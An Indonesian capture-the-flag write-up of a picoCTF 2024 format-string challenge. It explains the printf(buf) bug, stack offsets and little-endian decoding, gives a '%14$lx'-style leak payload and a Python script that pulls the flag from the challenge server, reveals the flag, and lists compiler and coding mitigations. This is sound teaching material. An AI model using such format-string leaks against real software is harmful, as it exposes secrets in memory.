# 434 - format string 1 (Binary Exploitation, picoCTF 2024, Medium)

## Challenge Metadata
- ID: 434 | Event: picoCTF 2024 | Author: CyLab Academy
- Category: Binary Exploitation | Difficulty: Medium (2) | Points: 200
- Flag: `academy{4n1m41_57y13_4x4_f14g_f7ab2890}`

## Problem Statement & Scope
Tantangan menyajikan sebuah biner ELF 64-bit dan kode sumber C (`format-string-1.c`). Program membaca berkas rahasia `secret-menu-item-1.txt`, `flag.txt`, dan `secret-menu-item-2.txt` ke dalam buffer stack lokal sebelum meminta pesanan dari pengguna (`scanf("%1024s", buf)`). Program kemudian mencetak kembali isi pesanan menggunakan pemanggilan fungsi `printf(buf)`.

## Teori & Akar Kerentanan (Root Cause)
1. **Uncontrolled Format String Vulnerability:**
   Pemanggilan `printf(buf)` tanpa format specifier statis (seharusnya `printf("%s", buf)`) memungkinkan pengguna memasukkan token pemformatan (seperti `%x`, `%lx`, `%p`, `%s`, `%n`).
2. **x86_64 ABI & Stack Layout Leaking:**
   Pada System V AMD64 ABI, 6 argumen pertama fungsi dilewatkan melalui register (`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`). Argumen ke-7 dan seterusnya diambil secara berurutan dari stack memori (`rsp + 0`, `rsp + 8`, dst).
   - Format specifier `%1$lx` s.d. `%5$lx` merefleksikan nilai register argumen.
   - Format specifier `%6$lx` merujuk ke elemen pertama stack.
   - Karena variabel lokal `flag[64]` dialokasikan pada stack fungsi `main()`, nilai string flag tersimpan langsung dalam blok-blok qword 64-bit pada stack offset `%14$lx` hingga `%18$lx`.
3. **Little-Endian Byte Ordering Reconstruction:**
   Arsitektur x86_64 menyimpan data integer multi-byte dalam memori dengan format little-endian (least significant byte pada alamat memori terendah). String hex yang dicetak `%lx` harus dibalik urutan bytenya per qword 8-byte untuk merekonstruksi teks ASCII yang benar.

## Rekonstruksi Eksploitasi Step-by-Step
1. **Analisis Source Code:**
   Mengidentifikasi bahwa `flag` dibaca dengan `fgets(flag, 64, fd)` dan disimpan di stack frame.
2. **Stack Memory Dump via Specifier:**
   Mengirimkan payload format string berurutan `%14$lx.%15$lx.%16$lx.%17$lx.%18$lx`:
   - Offset 14: `7b796d6564616361` -> little-endian decoded: `academy{`
   - Offset 15: `355f31346d316e34` -> little-endian decoded: `4n1m41_5`
   - Offset 16: `3478345f33317937` -> little-endian decoded: `7y13_4x4`
   - Offset 17: `37665f673431665f` -> little-endian decoded: `_f14g_f7`
   - Offset 18: `7d303938326261` -> little-endian decoded: `ab2890}`
3. **Rekonstruksi String:**
   Menggabungkan kelima pecahan menghasilkan string flag kompetisi utuh:
   `academy{4n1m41_57y13_4x4_f14g_f7ab2890}`.

## Script Reproduksi & PoC
Implementasi otomasi Python lengkap tersedia pada `scripts/solve_434_format_string_1.py`:
```python
import socket

s = socket.create_connection(("chatelaine.cylabacademy.net", 20261), timeout=20)
s.recv(1024)
payload = ".".join([f"%{i}$lx" for i in range(14, 19)]) + "\n"
s.sendall(payload.encode())

data = s.recv(4096).decode()
parts = data.split("Here's your order: ")[1].split("Bye!")[0].strip().split(".")
flag_bytes = bytearray()
for p in parts:
    flag_bytes.extend(bytes.fromhex(p.zfill(len(p) + len(p) % 2))[::-1])

print("Flag:", flag_bytes.decode())
```

## Mitigasi Defensif & Relevansi LKS Cyber Security
1. **Gunakan String Format Konstan:**
   Selalu gunakan format specifier statis pada pemanggilan keluarga fungsi printf:
   ```c
   printf("%s\n", buf);
   ```
2. **Aktifkan Proteksi Kompiler:**
   Gunakan compiler flags `-Wformat=2 -Werror=format-security` dan `-D_FORTIFY_SOURCE=2` untuk mendeteksi potensi format string bug secara statis dan menggagalkan eksekusi tidak aman saat runtime.
3. **Relevansi Modul LKS:**
   Topik ini merupakan silabus inti Binary Exploitation LKS tingkat provinsi & nasional dalam menguasai konsep calling convention, stack frame memory layout, dan arbitrary memory read.
